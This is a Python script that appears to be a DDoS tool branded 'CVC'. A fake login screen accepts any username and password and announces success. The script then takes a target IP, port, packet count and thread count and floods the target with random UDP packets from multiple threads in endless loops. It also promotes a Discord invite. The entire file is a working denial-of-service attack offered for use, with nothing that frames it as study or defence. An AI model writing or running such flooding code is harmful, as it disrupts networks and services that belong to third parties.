import random
import threading
import socket
import os,sys
import time
from colorama import Fore, init

os.system("cls")
print("""\033[92m
 █████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░                      
""")

print("—————————————————————————————————————————————————————")
username = str(input("Username :"))
password = str(input("passowrd : "))
print("—————————————————————————————————————————————————————")

os.system("cls")
print(f"\033[93mChecking {username}..")
time.sleep(2)

print(f"\033[93mVerifying {username}..")
time.sleep(3)

print(f"Loading . . .")
time.sleep(1)

print(f"\033[92mVerifying Is Done!!")
time.sleep(3)
sucess = str(input(f"\033[92mSUCESS LOGIN TO {username} PRESS ENTER TO CONTINUE. "))

os.system("cls")
print("""\033[96m
╦ ╦┌─┐┬  ┌─┐┌─┐┌┬┐┌─┐  ╔╦╗┌─┐  ╔═╗╦  ╦╔═╗
║║║├┤ │  │  │ ││││├┤    ║ │ │  ║  ╚╗╔╝║  
╚╩╝└─┘┴─┘└─┘└─┘┴ ┴└─┘   ╩ └─┘  ╚═╝ ╚╝ ╚═╝                         
""")
print("—————————————————————————————————————————————————————")
print(f"Welcome {username} To CVC")
print("Join Our Discord ")
print("https://dsc.gg/hxd_")
print("—————————————————————————————————————————————————————")

ip = str(input("IP :"))
port = int(input("PORT HOST :"))
choice = str(input("START ATTACK? Y/N :"))
times = int(input("PACKETS :"))
threads = int(input("THREADS :"))

def itznone():
    data = random._urandom(818)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print(f"\033[91m[X] \033[97mCVC \033[91mSENDING ATTACK TO \033[97m===> \033[91mIP \033[97m{ip}, \033[91mAND PORT \033[97m{port}\033[91m!!!")
        except:
            print("\033[94m[*] SERANGAN GAGAL ")

def itznone2():
    data = random._urandom(818)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print(f"\033[91m[￥] \033[97mCVC \033[91mSENDING ATTACK TO \033[97m===> \033[91mIP \033[97m{ip}, \033[91mAND PORT \033[97m{port}\033[91m!!!")
        except:
            s.close()
            print("\033[94m[*] SERANGAN GAGAL ")

for y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = itznone)
        th.start()
        th = threading.Thread(target = itznone2)
        th.start()
